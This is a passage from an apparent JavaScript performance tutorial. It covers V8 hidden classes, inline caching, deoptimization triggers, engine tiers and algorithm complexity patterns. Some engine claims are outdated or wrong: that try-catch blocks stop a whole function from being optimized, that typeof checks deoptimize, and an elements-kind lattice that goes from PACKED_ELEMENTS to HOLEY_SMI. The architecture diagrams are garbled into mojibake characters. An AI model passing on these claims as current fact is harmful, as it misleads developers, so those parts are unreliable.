// These share the same hidden class (FAST)
const obj1 = { x: 1, y: 2 };
const obj2 = { x: 3, y: 4 };
const obj3 = { x: 5, y: 6 };

// These have different hidden classes (SLOW)
const obj4 = { y: 8, x: 7 }; // Different order
const obj5 = { x: 9, y: 10, z: 11 }; // Different properties

// Visualizing hidden class transitions
function Point(x, y) {
  this.x = x; // Transition 1: empty -> {x}
  this.y = y; // Transition 2: {x} -> {x, y}
}

const p1 = new Point(1, 2);
const p2 = new Point(3, 4);
// p1 and p2 share same hidden class

// Breaking shared hidden class
p1.z = 5; // p1 gets new hidden class
// p2 still has original hidden class
```

#### Property Access Optimization

```javascript
// SLOW: Property names as variables
function getProperty(obj, prop) {
  return obj[prop]; // Dynamic property access - can't inline cache
}

// FAST: Direct property access
function getX(obj) {
  return obj.x; // Static property access - inline caching works
}

// SLOW: Adding properties after creation
function createUser() {
  const user = {};
  user.name = 'Alice';
  user.age = 30;
  user.email = 'alice@example.com';
  return user;
  // Each assignment creates new hidden class
}

// FAST: Object literal
function createUserFast() {
  return {
    name: 'Alice',
    age: 30,
    email: 'alice@example.com'
  };
  // Single hidden class
}

// FAST: Constructor
class User {
  constructor(name, age, email) {
    this.name = name;
    this.age = age;
    this.email = email;
  }
}

function createUserConstructor() {
  return new User('Alice', 30, 'alice@example.com');
  // All instances share hidden class
}
```

#### Property Deletion

```javascript
// VERY BAD: Deleting properties
function deleteProperty(obj) {
  delete obj.x; // Breaks hidden class, puts object in "dictionary mode"
  // Object becomes slow hash table instead of optimized structure
}

const obj = { x: 1, y: 2, z: 3 };
deleteProperty(obj);

// GOOD: Set to undefined instead
function nullifyProperty(obj) {
  obj.x = undefined; // Keeps hidden class intact
}

const obj2 = { x: 1, y: 2, z: 3 };
nullifyProperty(obj2);

// BETTER: Design objects to not need deletion
class OptimizedObject {
  constructor() {
    this.x = null; // Always has property, even if unused
    this.y = null;
    this.z = null;
  }
}
```

#### Monomorphic Property Access

```javascript
// Create consistent object shapes
class Rectangle {
  constructor(width, height) {
    this.width = width;
    this.height = height;
  }
  
  area() {
    return this.width * this.height;
  }
}

// FAST: All rectangles have same shape
const rectangles = [
  new Rectangle(10, 20),
  new Rectangle(30, 40),
  new Rectangle(50, 60)
];

function totalArea(shapes) {
  let total = 0;
  for (const shape of shapes) {
    total += shape.area(); // Monomorphic - V8 can inline
  }
  return total;
}

console.log(totalArea(rectangles)); // Fast

// SLOW: Mixed shapes
class Circle {
  constructor(radius) {
    this.radius = radius;
  }
  
  area() {
    return Math.PI * this.radius ** 2;
  }
}

const mixedShapes = [
  new Rectangle(10, 20),
  new Circle(15),
  new Rectangle(30, 40)
];

console.log(totalArea(mixedShapes)); // Polymorphic - slower
```

### Deoptimization Triggers

Certain patterns cause optimized code to deoptimize back to interpreted code.

#### Type Changes

```javascript
// Optimized for numbers
function add(a, b) {
  return a + b;
}

// Warm up with numbers
for (let i = 0; i < 10000; i++) {
  add(i, i + 1);
}

// Now optimized for number addition

// DEOPTIMIZATION: Pass strings
add('hello', 'world'); // Deoptimizes - now handles strings too

// Function becomes polymorphic, slower for numbers
```

#### Arguments Object

```javascript
// Using 'arguments' prevents optimization
function sumBad() {
  let total = 0;
  for (let i = 0; i < arguments.length; i++) {
    total += arguments[i]; // Prevents optimization
  }
  return total;
}

// GOOD: Use rest parameters
function sumGood(...numbers) {
  let total = 0;
  for (const num of numbers) {
    total += num;
  }
  return total;
}
```

#### For-In Loops

```javascript
// For-in loops can prevent optimization
function processObjectBad(obj) {
  let sum = 0;
  for (const key in obj) { // Can deoptimize
    sum += obj[key];
  }
  return sum;
}

// BETTER: Object.keys
function processObjectGood(obj) {
  let sum = 0;
  const keys = Object.keys(obj);
  for (let i = 0; i < keys.length; i++) {
    sum += obj[keys[i]];
  }
  return sum;
}

// BEST: Object.values if you don't need keys
function processObjectBest(obj) {
  let sum = 0;
  const values = Object.values(obj);
  for (const value of values) {
    sum += value;
  }
  return sum;
}
```

#### Changing Function Behavior

```javascript
// Function behavior should be consistent
function calculate(x, y) {
  if (typeof x !== 'number' || typeof y !== 'number') {
    // Type checking in function deoptimizes
    return 0;
  }
  return x + y;
}

// BETTER: Validate outside hot path
function validateAndCalculate(x, y) {
  if (typeof x !== 'number' || typeof y !== 'number') {
    return 0;
  }
  return calculateFast(x, y);
}

function calculateFast(x, y) {
  // Only called with validated numbers
  return x + y;
}
```

#### Try-Catch

```javascript
// Try-catch blocks prevent optimization of the entire function

// BAD: Try-catch around hot code
function processDataBad(data) {
  try {
    let sum = 0;
    for (let i = 0; i < data.length; i++) {
      sum += data[i] * 2; // Hot code in try block - can't optimize
    }
    return sum;
  } catch (e) {
    return 0;
  }
}

// GOOD: Isolate try-catch
function processDataGood(data) {
  return processDataInner(data);
}

function processDataInner(data) {
  // This function can be optimized
  let sum = 0;
  for (let i = 0; i < data.length; i++) {
    sum += data[i] * 2;
  }
  return sum;
}

// Wrap only when calling
function safeProcess(data) {
  try {
    return processDataInner(data);
  } catch (e) {
    return 0;
  }
}
```

#### Sparse Arrays and Holes

```javascript
// Sparse arrays deoptimize array operations
const sparse = [1, 2, 3];
sparse[1000] = 1000; // Creates holes - array becomes slow

// Operations on sparse arrays are slower
function sumSparse(arr) {
  let sum = 0;
  for (let i = 0; i < arr.length; i++) {
    sum += arr[i] || 0; // Must check for holes
  }
  return sum;
}

// GOOD: Dense arrays
const dense = new Array(1001).fill(0);
dense[1000] = 1000;

function sumDense(arr) {
  let sum = 0;
  for (let i = 0; i < arr.length; i++) {
    sum += arr[i]; // No hole checks needed
  }
  return sum;
}
```

### Engine Internals Deep Dive

Understanding what happens inside JavaScript engines helps write code that the engine can optimize.

#### V8 Architecture (Chrome, Node.js)

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                         V8 Engine                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚   Source Code                                                    â”‚
â”‚       â”‚                                                          â”‚
â”‚       â–¼                                                          â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                  â”‚
â”‚   â”‚  Parser   â”‚  â†’ Builds Abstract Syntax Tree (AST)            â”‚
â”‚   â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜                                                  â”‚
â”‚         â–¼                                                        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                  â”‚
â”‚   â”‚ Ignition  â”‚  â†’ Bytecode interpreter (fast startup)          â”‚
â”‚   â”‚(Interpreter)   Collects type feedback                       â”‚
â”‚   â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜                                                  â”‚
â”‚         â”‚ (hot function detected)                                â”‚
â”‚         â–¼                                                        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                  â”‚
â”‚   â”‚ TurboFan  â”‚  â†’ Optimizing compiler (fast execution)         â”‚
â”‚   â”‚(Compiler) â”‚     Uses type feedback for optimization          â”‚
â”‚   â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜                                                  â”‚
â”‚         â”‚ (type assumption violated)                             â”‚
â”‚         â–¼                                                        â”‚
â”‚   Deoptimization â†’ Back to Ignition bytecode                     â”‚
â”‚                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### What Ignition Does

```javascript
// Ignition compiles JavaScript to bytecode
function add(a, b) {
  return a + b;
}

// Ignition generates bytecode like:
// Ldar a1        (Load argument 1 into accumulator)
// Add a2         (Add argument 2)
// Return         (Return accumulator)

// While running, Ignition collects TYPE FEEDBACK:
// "add() was called with (int, int) 1000 times"
// This feedback guides TurboFan optimization
```

#### What TurboFan Does

```javascript
// TurboFan optimizes hot functions based on type feedback

function sum(arr) {
  let total = 0;
  for (let i = 0; i < arr.length; i++) {
    total += arr[i];
  }
  return total;
}

// If called repeatedly with integer arrays:
// - TurboFan assumes arr contains SMIs (Small Integers)
// - Generates machine code with integer math (no type checks)
// - Can unroll loops, inline functions, eliminate bounds checks

// If assumption breaks (e.g., arr contains floats):
// - Deoptimization: back to Ignition bytecode
// - Re-optimize with new type information
```

#### Shape Transitions (Hidden Classes)

```javascript
// V8 tracks object "shapes" (hidden classes) for optimization

// Shape C0: empty object {}
const obj = {};

// Shape C1: {x} 
obj.x = 1;

// Shape C2: {x, y}
obj.y = 2;

// Transition chain: C0 â†’ C1 â†’ C2

// Objects with same property order share shapes:
const a = { x: 1, y: 2 };  // Shape: {x, y}
const b = { x: 3, y: 4 };  // Shape: {x, y} (same!)

// Different order = different shape:
const c = { y: 1, x: 2 };  // Shape: {y, x} (different!)

// V8 uses shapes for inline caching:
function getX(obj) {
  return obj.x;
}

// First call: Cache miss, look up property, cache shape + offset
// Subsequent calls with same shape: Direct offset access (fast!)
```

#### Inline Caching (IC) States

```javascript
// IC State Machine:
// UNINITIALIZED â†’ MONOMORPHIC â†’ POLYMORPHIC â†’ MEGAMORPHIC

// UNINITIALIZED: Never called
function getX(obj) {
  return obj.x;  // IC state: UNINITIALIZED
}

// MONOMORPHIC: One shape seen (FASTEST)
getX({ x: 1, y: 2 });  // IC state: MONOMORPHIC (shape A)
getX({ x: 3, y: 4 });  // Still MONOMORPHIC (same shape)

// POLYMORPHIC: 2-4 shapes seen (still fast)
getX({ x: 1 });        // IC state: POLYMORPHIC (shapes A, B)
getX({ x: 1, z: 3 });  // POLYMORPHIC (shapes A, B, C)

// MEGAMORPHIC: >4 shapes seen (SLOWEST)
getX({ x: 1, a: 1 });
getX({ x: 1, b: 1 });
getX({ x: 1, c: 1 });
getX({ x: 1, d: 1 });
getX({ x: 1, e: 1 });  // IC state: MEGAMORPHIC

// MEGAMORPHIC = V8 gives up caching, does full property lookup every time
```

#### Object Representation Modes

```javascript
// V8 has different internal representations for objects:

// 1. FAST MODE (default): Hidden class + contiguous property array
const fast = { x: 1, y: 2, z: 3 };
// Properties stored in fixed-size array at known offsets

// 2. DICTIONARY MODE: Hash table (after delete or too many properties)
const dict = { x: 1, y: 2, z: 3 };
delete dict.y;  // Triggers dictionary mode!
// Properties stored in hash table (10x slower access)

// How to detect (Node.js with --allow-natives-syntax):
// %HasFastProperties(obj) returns true/false

// 3. SMI (Small Integer): 31-bit integers stored inline
const smi = 42;  // No heap allocation needed

// 4. DOUBLE: 64-bit floats in "double box"
const dbl = 3.14;  // Heap-allocated box

// 5. POINTER: Reference to heap object
const ptr = { x: 1 };  // Pointer to heap object
```

#### Elements Kinds (Array Optimization)

```javascript
// V8 tracks array "elements kinds" for optimization:

// PACKED_SMI_ELEMENTS: Dense array of small integers (fastest)
const smi = [1, 2, 3, 4, 5];

// PACKED_DOUBLE_ELEMENTS: Dense array of doubles
const dbl = [1.1, 2.2, 3.3];

// PACKED_ELEMENTS: Dense array of any objects
const obj = [{ x: 1 }, { x: 2 }];

// HOLEY_SMI_ELEMENTS: Sparse array of integers
const holey = [1, 2, , 4];  // Hole at index 2

// Elements kinds form a lattice - they only transition DOWN:
// PACKED_SMI â†’ PACKED_DOUBLE â†’ PACKED â†’ HOLEY_SMI â†’ HOLEY_DOUBLE â†’ HOLEY

// Once an array becomes HOLEY, it never goes back to PACKED!

const arr = [1, 2, 3];        // PACKED_SMI_ELEMENTS
arr.push(4.5);                // PACKED_DOUBLE_ELEMENTS
arr.push({ x: 1 });           // PACKED_ELEMENTS
arr[100] = 1;                 // HOLEY_ELEMENTS (created holes)

// HOLEY arrays require bounds checking on every access
```

#### SpiderMonkey (Firefox) Architecture

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     SpiderMonkey Engine                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚   Source Code                                                    â”‚
â”‚       â”‚                                                          â”‚
â”‚       â–¼                                                          â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                  â”‚
â”‚   â”‚  Parser   â”‚  â†’ Builds AST                                   â”‚
â”‚   â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜                                                  â”‚
â”‚         â–¼                                                        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                  â”‚
â”‚   â”‚ Baseline  â”‚  â†’ Fast-compiling JIT (like Ignition)           â”‚
â”‚   â”‚   JIT     â”‚     Collects type information                    â”‚
â”‚   â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜                                                  â”‚
â”‚         â”‚ (function becomes hot)                                 â”‚
â”‚         â–¼                                                        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                  â”‚
â”‚   â”‚ IonMonkey â”‚  â†’ Optimizing JIT (like TurboFan)               â”‚
â”‚   â”‚   JIT     â”‚     Heavy optimization, slower compile           â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                                  â”‚
â”‚                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Key differences from V8:
- SpiderMonkey uses "shapes" (same concept as V8 hidden classes)
- IonMonkey is more aggressive at speculative optimization
- SpiderMonkey has "Warp" (replaces IonMonkey frontend)
```

#### JavaScriptCore (Safari) Architecture

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     JavaScriptCore Engine                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚   Source Code                                                    â”‚
â”‚       â”‚                                                          â”‚
â”‚       â–¼                                                          â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                  â”‚
â”‚   â”‚    LLInt  â”‚  â†’ Low Level Interpreter (fastest startup)      â”‚
â”‚   â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜                                                  â”‚
â”‚         â–¼                                                        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                  â”‚
â”‚   â”‚ Baseline  â”‚  â†’ Simple JIT                                   â”‚
â”‚   â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜                                                  â”‚
â”‚         â–¼                                                        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                  â”‚
â”‚   â”‚    DFG    â”‚  â†’ Data Flow Graph JIT (medium optimization)    â”‚
â”‚   â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜                                                  â”‚
â”‚         â–¼                                                        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                  â”‚
â”‚   â”‚    FTL    â”‚  â†’ Faster Than Light JIT (max optimization)     â”‚
â”‚   â”‚  (LLVM)   â”‚     Uses LLVM backend                            â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                                  â”‚
â”‚                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

JSC has 4 tiers vs V8's 2 - more granular optimization levels
```

#### Writing Engine-Friendly Code

```javascript
// âœ… RULE 1: Consistent object shapes
// BAD: Dynamic property addition
function createUserBad(data) {
  const user = {};
  if (data.name) user.name = data.name;
  if (data.age) user.age = data.age;  // Different shapes!
  return user;
}

// GOOD: Always same properties
function createUserGood(data) {
  return {
    name: data.name ?? null,
    age: data.age ?? null
  };
}

// âœ… RULE 2: Monomorphic function calls
// BAD: Pass different types
function process(item) {
  return item.value * 2;
}
process({ value: 1, type: 'a' });
process({ value: 2, type: 'b', extra: true });  // Different shape!

// GOOD: Same shape always
class Item {
  constructor(value, type) {
    this.value = value;
    this.type = type;
  }
}
process(new Item(1, 'a'));
process(new Item(2, 'b'));

// âœ… RULE 3: Avoid deoptimization triggers
// BAD: Type changes
function addNumbers(a, b) { return a + b; }
addNumbers(1, 2);      // Optimized for integers
addNumbers('a', 'b');  // DEOPT! Now handles strings

// GOOD: Separate functions for different types
function addInts(a, b) { return (a | 0) + (b | 0); }
function addStrings(a, b) { return String(a) + String(b); }

// âœ… RULE 4: Dense arrays
// BAD: Sparse array
const sparse = [];
sparse[1000] = 'value';  // Creates holes

// GOOD: Dense array
const dense = new Array(1001).fill(null);
dense[1000] = 'value';

// âœ… RULE 5: Avoid delete
// BAD: delete makes object slow
const obj = { x: 1, y: 2 };
delete obj.x;  // Dictionary mode!

// GOOD: Set to undefined
obj.x = undefined;  // Keeps fast mode
```

---

## 23.2 Algorithm Optimization

Understanding algorithmic complexity helps write performant code.

### Time Complexity (Big O)

Big O notation describes how an algorithm's runtime grows with input size.

#### Common Time Complexities

```javascript
// O(1) - Constant time
// Runtime doesn't depend on input size
function getFirst(arr) {
  return arr[0]; // Always one operation
}

function hashMapLookup(map, key) {
  return map.get(key); // Hash table lookup is O(1) average case
}

// O(log n) - Logarithmic time
// Runtime grows logarithmically with input size
function binarySearch(arr, target) {
  let left = 0;
  let right = arr.length - 1;
  
  while (left <= right) {
    const mid = Math.floor((left + right) / 2);
    
    if (arr[mid] === target) return mid;
    if (arr[mid] < target) {
      left = mid + 1;
    } else {
      right = mid - 1;
    }
  }
  
  return -1;
}

// Sorted array of 1,000,000 items: max ~20 comparisons
// Sorted array of 1,000,000,000 items: max ~30 comparisons

// O(n) - Linear time
// Runtime grows linearly with input size
function findMax(arr) {
  let max = arr[0];
  
  for (let i = 1; i < arr.length; i++) {
    if (arr[i] > max) {
      max = arr[i];
    }
  }
  
  return max;
}

// Array of 1000 items: 1000 operations
// Array of 2000 items: 2000 operations

// O(n log n) - Linearithmic time
// Most efficient comparison-based sorting algorithms
function mergeSort(arr) {
  if (arr.length <= 1) return arr;
  
  const mid = Math.floor(arr.length / 2);
  const left = mergeSort(arr.slice(0, mid));
  const right = mergeSort(arr.slice(mid));
  
  return merge(left, right);
}

function merge(left, right) {
  const result = [];
  let i = 0, j = 0;
  
  while (i < left.length && j < right.length) {
    if (left[i] < right[j]) {
      result.push(left[i++]);
    } else {
      result.push(right[j++]);
    }
  }
  
  return result.concat(left.slice(i)).concat(right.slice(j));
}

// O(nÂ²) - Quadratic time
// Nested loops over same data
function bubbleSort(arr) {
  const n = arr.length;
  
  for (let i = 0; i < n - 1; i++) {
    for (let j = 0; j < n - i - 1; j++) {
      if (arr[j] > arr[j + 1]) {
        [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];
      }
    }
  }
  
  return arr;
}

// Array of 100 items: 10,000 operations
// Array of 1000 items: 1,000,000 operations

// O(2â¿) - Exponential time
// Very slow, usually indicates inefficient recursion
function fibonacci(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
}

// fibonacci(10): 177 calls
// fibonacci(20): 21,891 calls
// fibonacci(40): 331,160,281 calls!
```

#### Analyzing Time Complexity

```javascript
// Example 1: Find duplicates
function hasDuplicates(arr) {
  for (let i = 0; i < arr.length; i++) {        // n iterations
    for (let j = i + 1; j < arr.length; j++) {  // n iterations
      if (arr[i] === arr[j]) {
        return true;
      }
    }
  }
  return false;
}
// Time: O(nÂ²) - nested loops

// Better solution using Set
function hasDuplicatesFast(arr) {
  const seen = new Set();
  
  for (const item of arr) {  // n iterations
    if (seen.has(item)) {    // O(1) lookup
      return true;
    }
    seen.add(item);          // O(1) insertion
  }
  
  return false;
}
// Time: O(n) - single loop with O(1) operations

// Example 2: Two Sum problem
function twoSumSlow(arr, target) {
  for (let i = 0; i < arr.length; i++) {
    for (let j = i + 1; j < arr.length; j++) {
      if (arr[i] + arr[j] === target) {
        return [i, j];
      }
    }
  }
  return null;
}
// Time: O(nÂ²)

function twoSumFast(arr, target) {
  const map = new Map();
  
  for (let i = 0; i < arr.length; i++) {
    const complement = target - arr[i];
    
    if (map.has(complement)) {
      return [map.get(complement), i];
    }
    
    map.set(arr[i], i);
  }
  
  return null;
}
// Time: O(n)

// Benchmark
const largeArray = Array.from({ length: 10000 }, (_, i) => i);

console.time('O(nÂ²) solution');
twoSumSlow(largeArray, 19998);
console.timeEnd('O(nÂ²) solution');

console.time('O(n) solution');
twoSumFast(largeArray, 19998);
console.timeEnd('O(n) solution');
```

#### Optimizing Common Patterns

```javascript
// Pattern 1: Array search
// BAD: O(n) for each search
function findMultiple(arr, targets) {
  const results = [];
  for (const target of targets) {
    results.push(arr.includes(target)); // O(n) each time
  }
  return results;
}
// Total: O(n Ã— m) where m is targets.length

// GOOD: O(n) setup, O(1) per search
function findMultipleFast(arr, targets) {
  const set = new Set(arr); // O(n)
  const results = [];
  for (const target of targets) {
    results.push(set.has(target)); // O(1) each time
  }
  return results;
}
// Total: O(n + m)

// Pattern 2: Remove duplicates
// BAD: O(nÂ²)
function removeDuplicatesSlow(arr) {
  const result = [];
  for (const item of arr) {
    if (!result.includes(item)) { // O(n) check
      result.push(item);
    }
  }
  return result;
}

// GOOD: O(n)
function removeDuplicatesFast(arr) {
  return [...new Set(arr)]; // Set removes duplicates
}

// Pattern 3: Counting occurrences
// O(n)
function countOccurrences(arr) {
  const counts = new Map();
  
  for (const item of arr) {
    counts.set(item, (counts.get(item) || 0) + 1);
  }
  
  return counts;
}

// Pattern 4: Finding pairs with sum
// O(n) using hash map
function findPairsWithSum(arr, target) {
  const pairs = [];
  const seen = new Set();
  
  for (const num of arr) {
    const complement = target - num;
    
    if (seen.has(complement)) {
      pairs.push([complement, num]);
    }
    
    seen.add(num);
  }
  
  return pairs;
}
```

### Space Complexity

Space complexity measures memory usage relative to input size.

#### Common Space Complexities

```javascript
// O(1) - Constant space
// Memory usage doesn't grow with input
function sum(arr) {
  let total = 0; // Fixed variables
  for (const num of arr) {
    total += num;
  }
  return total;
}

// O(n) - Linear space
// Memory grows linearly with input
function double(arr) {
  const result = []; // New array of size n
  for (const num of arr) {
    result.push(num * 2);
  }
  return result;
}

// Recursion space complexity
// O(n) space - call stack depth
function factorial(n) {
  if (n <= 1) return 1;
  return n * factorial(n - 1);
  // Each call adds frame to stack
}

// O(1) space - iterative version
function factorialIterative(n) {
  let result = 1;
  for (let i = 2; i <= n; i++) {
    result *= i;
  }
  return result;
}

// O(nÂ²) space - 2D array
function createMatrix(n) {
  const matrix = [];
  for (let i = 0; i < n; i++) {
    matrix[i] = new Array(n).fill(0);
  }
  return matrix;
}
```

#### Space-Time Tradeoffs

```javascript
// Fibonacci: Time vs Space tradeoffs

// BAD: O(2â¿) time, O(n) space (call stack)
function fibRecursive(n) {
  if (n <= 1) return n;
  return fibRecursive(n - 1) + fibRecursive(n - 2);
}

// BETTER: O(n) time, O(n) space (memoization)
function fibMemoized(n, memo = {}) {
  if (n in memo) return memo[n];
  if (n <= 1) return n;
  
  memo[n] = fibMemoized(n - 1, memo) + fibMemoized(n - 2, memo);
  return memo[n];
}

// BEST: O(n) time, O(1) space (iterative)
function fibIterative(n) {
  if (n <= 1) return n;
  
  let prev = 0, curr = 1;
  
  for (let i = 2; i <= n; i++) {
    const next = prev + curr;
    prev = curr;
    curr = next;
  }
  
  return curr;
}

// Benchmark
console.time('Recursive');
fibRecursive(30);
console.timeEnd('Recursive'); // Very slow

console.time('Memoized');
fibMemoized(30);
console.timeEnd('Memoized'); // Fast

console.time('Iterative');
fibIterative(30);
console.timeEnd('Iterative'); // Fastest

// Memoization pattern for expensive functions
function memoize(fn) {
  const cache = new Map();
  
  return (...args) => {
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      return cache.get(key);
    }
    
    const result = fn(...args);
    cache.set(key, result);
    return result;
  };
}

// Trading space for time
const expensiveCalculation = memoize((n) => {
  // Simulate expensive operation
  let result = 0;
  for (let i = 0; i < n * 1000000; i++) {
    result += Math.sqrt(i);
  }
  return result;
});

console.time('First call');
expensiveCalculation(10);
console.timeEnd('First call'); // Slow

console.time('Cached call');
expensiveCalculation(10);
console.timeEnd('Cached call'); // Instant
```

### Common Algorithm Patterns

Recognizing patterns helps choose the right algorithm.

#### Sliding Window

```javascript
// Problem: Find max sum of k consecutive elements
// BAD: O(n Ã— k) - recalculate each window
function maxSumSlow(arr, k) {
  let maxSum = -Infinity;
  
  for (let i = 0; i <= arr.length - k; i++) {
    let sum = 0;
    for (let j = i; j < i + k; j++) {
      sum += arr[j];
    }
    maxSum = Math.max(maxSum, sum);
  }
  
  return maxSum;
}

// GOOD: O(n) - sliding window
function maxSumFast(arr, k) {
  let windowSum = 0;
  
  // Calculate first window
  for (let i = 0; i < k; i++) {
    windowSum += arr[i];
  }
  
  let maxSum = windowSum;
  
  // Slide window
  for (let i = k; i < arr.length; i++) {
    windowSum = windowSum - arr[i - k] + arr[i];
    maxSum = Math.max(maxSum, windowSum);
  }
  
  return maxSum;
}

// Longest substring without repeating characters
function lengthOfLongestSubstring(s) {
  const seen = new Map();
  let maxLength = 0;
  let start = 0;
  
  for (let end = 0; end < s.length; end++) {
    const char = s[end];
    
    if (seen.has(char) && seen.get(char) >= start) {
      start = seen.get(char) + 1;
    }
    
    seen.set(char, end);
    maxLength = Math.max(maxLength, end - start + 1);
  }
  
  return maxLength;
}
```

#### Two Pointers

```javascript
// Problem: Check if string is palindrome
// O(n) - two pointers from ends
function isPalindrome(s) {
  let left = 0;
  let right = s.length - 1;
  
  while (left < right) {
    if (s[left] !== s[right]) {
      return false;
    }
    left++;
    right--;
  }
  
  return true;
}

// Problem: Remove duplicates from sorted array in-place
function removeDuplicates(arr) {
  if (arr.length === 0) return 0;
  
  let writeIndex = 1;
  
  for (let readIndex = 1; readIndex < arr.length; readIndex++) {
    if (arr[readIndex] !== arr[readIndex - 1]) {
      arr[writeIndex] = arr[readIndex];
      writeIndex++;
    }
  }
  
  return writeIndex;
}

// Problem: Container with most water
function maxArea(heights) {
  let maxArea = 0;
  let left = 0;
  let right = heights.length - 1;
  
  while (left < right) {
    const width = right - left;
    const height = Math.min(heights[left], heights[right]);
    maxArea = Math.max(maxArea, width * height);
    
    if (heights[left] < heights[right]) {
      left++;
    } else {
      right--;
    }
  }
  
  return maxArea;
}
```

#### Binary Search Variations

```javascript
// Standard binary search
function binarySearch(arr, target) {
  let left = 0;
  let right = arr.length - 1;
  
  while (left <= right) {
    const mid = Math.floor((left + right) / 2);
    
    if (arr[mid] === target) return mid;
    if (arr[mid] < target) {
      left = mid + 1;
    } else {
      right = mid - 1;
    }
  }
  
  return -1;
}

// Find first occurrence
function findFirst(arr, target) {
  let left = 0;
  let right = arr.length - 1;
  let result = -1;
  
  while (left <= right) {
    const mid = Math.floor((left + right) / 2);
    
    if (arr[mid] === target) {
      result = mid;
      right = mid - 1; // Continue searching left
